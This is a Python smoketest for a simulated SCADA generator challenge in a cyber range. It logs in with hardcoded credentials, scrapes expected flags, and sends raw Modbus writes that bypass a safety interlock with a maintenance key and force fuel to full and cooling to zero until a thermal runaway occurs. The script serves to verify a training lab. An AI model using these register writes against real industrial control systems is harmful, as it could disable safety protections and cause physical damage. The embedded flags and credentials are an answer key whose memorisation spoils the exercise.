#!/usr/bin/env python3
"""
A5 SCADA Generator HMI smoketest.

Runs the full attack chain from inside a container on the scada network
(a3-intranet is the designed pivot point — it's multi-homed to
corporate+scada+lab). Uses only the python stdlib (socket + urllib) so it
can run in a3-intranet without installing pymodbus.

Usage (from the range host):
    docker compose -f /home/atomik/range/docker-compose.yml up -d --force-recreate a5-scada
    docker cp smoketest.py a3-intranet:/tmp/a5-smoke.py
    docker exec a3-intranet python3 /tmp/a5-smoke.py

NOTE: thermal runaway is one-shot per container. You MUST force-recreate
a5-scada before each run; otherwise the runaway test will see "already
destroyed" state and the attack chain can't be re-proven on this instance.

Exits 0 on full pass, 1 on any failure.
"""

import json
import re
import socket
import struct
import sys
import time
import urllib.request

HOST = "scada-gw.boreas.local"
WEB_PORT = 8080
MODBUS_PORT = 502

EXPECTED_FLAG_18 = "FLAG{1d4e7b0a3c9f8265}"
EXPECTED_FLAG_19 = "FLAG{a7f2c8d0e5b34169}"
EXPECTED_AUTH_USER = "svc-scada"
EXPECTED_AUTH_PASS = "Sc@da#2025!"
MAINTENANCE_KEY = 7734

fail_count = 0


def pass_(label):
    print(f"  [PASS] {label}")


def fail(label):
    global fail_count
    fail_count += 1
    print(f"  [FAIL] {label}")


def check(label, ok):
    (pass_ if ok else fail)(label)
    return ok


def check_flag(label, expected, actual):
    check(f"{label} = {expected}", expected == actual)


def mb_write(sock, address, value, unit=1):
    tid = 1
    pdu = struct.pack(">BHH", 6, address, value)
    mbap = struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit)
    sock.sendall(mbap + pdu)
    sock.recv(12)


def mb_read(sock, address, count, unit=1):
    tid = 2
    pdu = struct.pack(">BHH", 3, address, count)
    mbap = struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit)
    sock.sendall(mbap + pdu)
    hdr = sock.recv(9)
    if len(hdr) < 9:
        return None
    byte_count = hdr[8]
    body = b""
    while len(body) < byte_count:
        body += sock.recv(byte_count - len(body))
    return struct.unpack(">" + "H" * count, body)


def http_get(path):
    with urllib.request.urlopen(f"http://{HOST}:{WEB_PORT}{path}", timeout=5) as r:
        return r.read().decode()


def api_status():
    return json.loads(http_get("/api/status"))


print(f"A5 smoketest - target={HOST}:{WEB_PORT} modbus={HOST}:{MODBUS_PORT}")

print()
print("--- Dashboard + flag 18 in footer ---")
home = http_get("/")
flag18 = next(iter(re.findall(r"FLAG\{[a-f0-9]+\}", home)), "")
check_flag("flag 18", EXPECTED_FLAG_18, flag18)
check("dashboard shows ONLINE status or CRITICAL", "ONLINE" in home or "CRITICAL" in home)

print()
print("--- Architecture page reveals Modbus port 502 and register map ---")
arch = http_get("/architecture")
check("mentions Modbus port 502", "502" in arch)
check("mentions HR 100 interlock", "HR 100" in arch)
check("mentions HR 200 maintenance key", "HR 200" in arch)
check("mentions svc-scada auth", "svc-scada" in arch)

print()
print("--- System logs show sensor drift incident ---")
logs = http_get("/logs")
check("logs mention D. Kowalski recalibration", "Kowalski" in logs)
check("logs mention thermal safety event", "Thermal safety" in logs or "thermal" in logs.lower())

print()
print("--- Authentication via /login with svc-scada creds ---")
import urllib.parse
from http.cookiejar import CookieJar
cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
try:
    unauth = opener.open(f"http://{HOST}:{WEB_PORT}/control", timeout=5)
    unauth_body = unauth.read().decode()
    check("/control without auth shows login form (not control panel)",
          "AUTHENTICATION REQUIRED" in unauth_body or "Login" in unauth_body or "username" in unauth_body.lower())

    data = urllib.parse.urlencode({
        "username": EXPECTED_AUTH_USER,
        "password": EXPECTED_AUTH_PASS,
    }).encode()
    req = urllib.request.Request(f"http://{HOST}:{WEB_PORT}/login", data=data)
    opener.open(req, timeout=5)
    authed = opener.open(f"http://{HOST}:{WEB_PORT}/control", timeout=5)
    ctrl = authed.read().decode()
    check("after login /control returns control panel", "CONTROL PANEL" in ctrl)

    bad_cj = CookieJar()
    bad_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(bad_cj))
    bad_data = urllib.parse.urlencode({"username": EXPECTED_AUTH_USER, "password": "wrong"}).encode()
    bad_req = urllib.request.Request(f"http://{HOST}:{WEB_PORT}/login", data=bad_data)
    bad_resp = bad_opener.open(bad_req, timeout=5)
    bad_body = bad_resp.read().decode()
    check("wrong password rejected with error", "Invalid credentials" in bad_body)
except Exception as e:
    fail(f"auth flow broke: {e}")

print()
print("--- Direct Modbus/TCP read of initial state ---")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect((HOST, MODBUS_PORT))
    pass_("Modbus TCP socket connected")
    vals = mb_read(s, 0, 12)
    check("HR[0] generator status readable", vals is not None)
    initial_state = api_status()
    if initial_state.get("runaway_complete"):
        print("  [NOTE] generator already in runaway state - skipping attack chain, extracting flag 19 from destroyed page")
        flag19 = next((f for f in re.findall(r"FLAG\{[a-f0-9]+\}", home) if f != EXPECTED_FLAG_18), "")
        check_flag("flag 19 (from already-destroyed page)", EXPECTED_FLAG_19, flag19)
    else:
        print()
        print("--- Interlock: wrong maintenance key must be rejected ---")
        mb_write(s, 200, 9999)
        mb_write(s, 100, 0)
        time.sleep(0.3)
        st = api_status()
        check("interlock still engaged after bad key", st["interlock"] == 1)
        check("thermal_safety still enabled after bad key", st["thermal_safety"] == 1)

        print()
        print("--- Interlock: correct maintenance key 7734 bypasses hardware interlock ---")
        mb_write(s, 200, MAINTENANCE_KEY)
        mb_write(s, 100, 0)
        time.sleep(0.3)
        st = api_status()
        check("interlock bypassed after correct key", st["interlock"] == 0)
        check("thermal_safety disabled after bypass", st["thermal_safety"] == 0)

        print()
        print("--- Thermal runaway: fuel=100%, cooling=0% ---")
        mb_write(s, 10, 100)
        mb_write(s, 11, 0)
        print("  wrote fuel=100 cooling=0; waiting for runaway...")
        flag19 = ""
        for i in range(25):
            time.sleep(1)
            html = http_get("/")
            if "CRITICAL" in html or "THERMAL RUNAWAY" in html:
                all_flags = re.findall(r"FLAG\{[a-f0-9]+\}", html)
                flag19 = next((f for f in all_flags if f != EXPECTED_FLAG_18), "")
                print(f"  runaway fired at t={i+1}s")
                break
        else:
            fail("timed out waiting for thermal runaway")
        check_flag("flag 19", EXPECTED_FLAG_19, flag19)
finally:
    s.close()

print()
if fail_count == 0:
    print("A5 smoketest: PASS")
    sys.exit(0)
else:
    print(f"A5 smoketest: FAIL ({fail_count} failure(s))")
    sys.exit(1)
